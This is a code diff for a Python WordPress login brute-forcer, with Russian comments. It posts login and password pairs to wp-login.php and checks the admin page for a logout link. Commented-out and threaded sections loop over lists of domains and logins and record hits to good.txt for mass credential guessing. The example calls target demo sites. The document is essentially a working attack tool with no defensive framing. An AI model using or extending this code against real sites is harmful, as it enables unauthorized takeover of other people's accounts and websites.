@@ -32,75 +32,57 @@ file.close()
 
 #theard_count = 5
 def brut(host, login, pwd):
-    url = 'http://'+host+'/wp-login.php'
     payload = {
-    'log': login,
-    'pwd': pwd,
-    'wp-submit': 'Log+In',
-    'rememberme': 'forever',
-    'redirect_to': 'https://'+host+'/wp-admin',
-    'testcookie': '1'
-}
-    print(url)
-    print(payload)
-    try:
-        s = requests.Session()
-        s.post(url, data=payload, headers=headers, timeout = 10)
+        'log':login,
+        'pwd':pwd,
+        #'wp-submit': 'Log+In',
+        #'rememberme': 'forever',
+        'redirect_to': 'https://'+host+'/wp-admin',
+        'testcookie': '1'
+    }
+    url = 'http://'+host+'/wp-login.php'
+    s = requests.Session()
+    try:    
+        s.post(url, data=payload, headers=headers)
     except Exception:
+        print('ERROR')
         return False
-        print('Find ERROR')
-    response = s.get('http://'+host+'/wp-admin', headers=headers,)
-    print(response.text)
+    response = s.get('http://'+host+'/wp-admin', headers=headers)
     if response.text.find('logout')>0:
         return True
     else:
         return False
 
-res = brut('demos1.softaculous.com/WordPress', 'admin', 'pass')
+res = brut('demo.wpdownloadmanager.com/wpdmpro','demo','demo')
 if res:
-    print('1')
+    print('11')
 else:
-    print('0')
+    print('00')
 
-'''def brut(host):
-    url = 'http://'+host+'/wp-login.php'
-    #payload = {'log': login, 'pwd': pwd}
-    for i in range(len(l_list)):
-        for i in range(len(p_list)):
-            login = l_list[i].strip()
-            pwd = p_list[i].strip()
-            print url
-            print login+'-'+pwd
-            try:
-                payload = {'log': login, 'pwd': pwd}
-                response = requests.post(url, data=payload, headers=headers, timeout = 10)    
-            except Exception:
-                return False
-            else:
-                if response.text.find('login_error')<0:
-                    return True
-                else:
-                    return False'''
 '''for i in range(len(d_list)):
     url = d_list[i].strip()
     for i in range(len(l_list)):
         login = l_list[i].strip()    
         try:
-            if brut(url, login, 'pass'):
+            if brut(url, login, 'demo'):
+                print(url)
+                print(login+' demo')
                 open('good.txt', 'a+').write(url + '\n')
-                print '1'
+                print('1')
             else:
-                print '0'
+                print(url)
+                print(login+' demo')
+                print('0')
         except Exception:
-            print 'error'''
-'''def run(queue, result_queue):
+            print('error')'''
+def run(queue, result_queue):
     # Цикл продолжается пока очередь задач не станет пустой
     while not queue.empty():
         # получаем первую задачу из очереди
         host = queue.get_nowait()
         print '{} checking in thread {}'.format(host, current_thread())
         # проверяем URL
-        status = check_url(host)
+        status = brut(host, login, pwd)
         # сохраняем результат для дальнейшей обработки
         result_queue.put_nowait((status, host))
         # сообщаем о выполнении полученной задачи
